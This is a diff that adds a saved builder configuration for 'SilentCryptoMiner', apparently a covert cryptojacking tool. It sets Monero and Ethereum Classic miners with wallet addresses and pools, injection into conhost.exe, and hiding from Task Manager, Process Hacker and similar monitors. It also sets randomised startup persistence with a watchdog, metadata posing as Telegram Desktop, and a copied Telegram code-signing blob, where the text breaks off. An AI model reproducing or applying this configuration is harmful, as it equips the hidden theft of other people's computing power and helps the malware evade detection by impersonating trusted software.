@@ -1,0 +1,662 @@
+<?xml version="1.0" encoding="windows-1251"?>
+<Form>
+  <Control Type="MephTheme" Name="formBuilder">
+    <Visible>True</Visible>
+    <Enabled>True</Enabled>
+    <Control Type="MephTabcontrol" Name="tabcontrolBuilder">
+      <Visible>True</Visible>
+      <Enabled>True</Enabled>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabMain">
+        <Visible>True</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephComboBox" Name="comboLanguage">
+          <Text>Russian</Text>
+          <SelectedIndex>4</SelectedIndex>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnLoadState">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnSaveState">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephListBox" Name="listMiners">
+          <Item Type="SilentCryptoMiner.MinerXMR">
+            <Control Type="MephTheme" Name="formMinerXMR">
+              <Visible>True</Visible>
+              <Enabled>True</Enabled>
+              <Control Type="MephTabcontrol" Name="tabcontrolMinerXMR">
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabConnection">
+                  <Visible>True</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephComboBox" Name="comboInjection">
+                    <Text>conhost.exe</Text>
+                    <SelectedIndex>0</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtPoolUsername">
+                    <Text>45oJ7sZPSzfPq7cJKqv8MDN7JwWp2weNg5WhuF59LhA48kKgA1ZfgMH99ezQLZ4tKvXi8Gp1A1ijP5CNs75XtiMfCA71pk8</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtPoolURL">
+                    <Text>pool.supportxmr.com:443</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtPoolPassword">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabMining">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephToggleSwitch" Name="toggleProcessKiller">
+                    <Text />
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboAlgorithm">
+                    <Text>rx/0</Text>
+                    <SelectedIndex>0</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephToggleSwitch" Name="toggleStealth">
+                    <Text />
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboIdleCPU">
+                    <Text>80%</Text>
+                    <SelectedIndex>8</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboMaxCPU">
+                    <Text>20%</Text>
+                    <SelectedIndex>2</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephToggleSwitch" Name="toggleSSL">
+                    <Text />
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephToggleSwitch" Name="toggleNicehash">
+                    <Text />
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephToggleSwitch" Name="toggleIdle">
+                    <Text />
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtIdleWait">
+                    <Text>5</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabAdvanced">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephToggleSwitch" Name="toggleStealthFullscreen">
+                    <Text />
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephCheckBox" Name="chkAPI">
+                    <Text>Ссылка на конечный API (URL)</Text>
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephCheckBox" Name="chkAdvParam">
+                    <Text>Расширенные параметры</Text>
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephCheckBox" Name="chkRemoteConfig">
+                    <Text>Удалённая конфигурация</Text>
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtAPI">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>False</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtKillTargets">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtStealthTargets">
+                    <Text>Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtAdvParam">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>False</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtRemoteConfig">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabJSON">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephTextBox" Name="txtJSON">
+                    <Text>{
+    "algo": "rx/0",
+    "pool": "pool.supportxmr.com",
+    "port": 443,
+    "wallet": "your_address_monero(xmr)",
+    "password": "lib",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 20,
+    "idle-wait": 5,
+    "idle-cpu": 80,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+              </Control>
+            </Control>
+          </Item>
+          <Item Type="SilentCryptoMiner.MinerETH">
+            <Control Type="MephTheme" Name="formMinerETH">
+              <Visible>True</Visible>
+              <Enabled>True</Enabled>
+              <Control Type="MephTabcontrol" Name="tabcontrolMinerETH">
+                <Visible>True</Visible>
+                <Enabled>True</Enabled>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabConnection">
+                  <Visible>True</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephGroupBox" Name="groupOptional">
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                    <Control Type="MephTextBox" Name="txtPoolPassowrd">
+                      <Text />
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                    <Control Type="MephTextBox" Name="txtPoolWorker">
+                      <Text>lib</Text>
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                    <Control Type="MephTextBox" Name="txtPoolData">
+                      <Text />
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                  </Control>
+                  <Control Type="MephGroupBox" Name="groupRequired">
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                    <Control Type="MephTextBox" Name="txtPoolURL">
+                      <Text>etc.2miners.com:11010</Text>
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                    <Control Type="MephTextBox" Name="txtPoolUsername">
+                      <Text>0x17bcE789Ab503aA345Fc860F4566E13393BCABdc</Text>
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                    <Control Type="MephComboBox" Name="comboPoolScheme">
+                      <Text>stratum (Standard)</Text>
+                      <SelectedIndex>0</SelectedIndex>
+                      <Visible>True</Visible>
+                      <Enabled>True</Enabled>
+                    </Control>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabMining">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephToggleSwitch" Name="toggleProcessKiller">
+                    <Text />
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboAlgorithm">
+                    <Text>etchash</Text>
+                    <SelectedIndex>1</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboIdleGPU">
+                    <Text>80%</Text>
+                    <SelectedIndex>8</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboMaxGPU">
+                    <Text>0%</Text>
+                    <SelectedIndex>0</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephComboBox" Name="comboInjection">
+                    <Text>conhost.exe</Text>
+                    <SelectedIndex>0</SelectedIndex>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephToggleSwitch" Name="toggleStealth">
+                    <Text />
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtIdleWait">
+                    <Text>5</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephToggleSwitch" Name="toggleIdle">
+                    <Text />
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabAdvanced">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephToggleSwitch" Name="toggleStealthFullscreen">
+                    <Text />
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephCheckBox" Name="chkAPI">
+                    <Text>Ссылка на конечный API (URL)</Text>
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephCheckBox" Name="chkAdvParam">
+                    <Text>Расширенные параметры</Text>
+                    <Checked>False</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephCheckBox" Name="chkRemoteConfig">
+                    <Text>Удалённая конфигурация</Text>
+                    <Checked>True</Checked>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtAPI">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>False</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtKillTargets">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtStealthTargets">
+                    <Text>Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtAdvParam">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>False</Enabled>
+                  </Control>
+                  <Control Type="MephTextBox" Name="txtRemoteConfig">
+                    <Text />
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+                <Control Type="System.Windows.Forms.TabPage" Name="tabJSON">
+                  <Visible>False</Visible>
+                  <Enabled>True</Enabled>
+                  <Control Type="MephTextBox" Name="txtJSON">
+                    <Text>{
+    "url": "stratum://`0x17bcE789Ab503aA345Fc860F4566E13393BCABdc`.lib@etc.2miners.com:11010",
+    "algo": "etchash",
+    "max-gpu": 0,
+    "idle-wait": 5,
+    "idle-gpu": 80,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}</Text>
+                    <Visible>True</Visible>
+                    <Enabled>True</Enabled>
+                  </Control>
+                </Control>
+              </Control>
+            </Control>
+          </Item>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnMinerRemove">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnMinerEdit">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnMinerAdd">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabStartup">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephButton" Name="btnStartupEntryNameRandomize">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnStartupFileNameRandomize">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtStartupFileName">
+          <Text>oaocofwmfjha\gmstcccpdzbb.exe</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleAutoDelete">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleWatchdog">
+          <Text />
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephCheckBox" Name="chkStartup">
+          <Text>Enabled</Text>
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtStartupEntryName">
+          <Text>XLZQHCLS</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephComboBox" Name="txtStartupPath">
+          <Text>ProgramData</Text>
+          <SelectedIndex>0</SelectedIndex>
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabAssembly">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephCheckBox" Name="chkAssembly">
+          <Text>Enabled</Text>
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnAssemblyRandom">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyTitle">
+          <Text />
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnAssemblyClone">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyProduct">
+          <Text>Telegram FZ-LLC</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyVersion4">
+          <Text>0</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyDescription">
+          <Text>Telegram Desktop</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyVersion3">
+          <Text>2</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyCopyright">
+          <Text>Copyright (C) 2014-2023</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyVersion2">
+          <Text>12</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyCompany">
+          <Text>Telegram Desktop</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyVersion1">
+          <Text>4</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtAssemblyTrademark">
+          <Text />
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabIcon">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephCheckBox" Name="chkIcon">
+          <Text>Disabled</Text>
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="System.Windows.Forms.PictureBox" Name="picIcon">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnIconBrowse">
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtIconPath">
+          <Text>Path to icon...</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabSignature">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephTextBox" Name="txtSignatureData">
+          <Text>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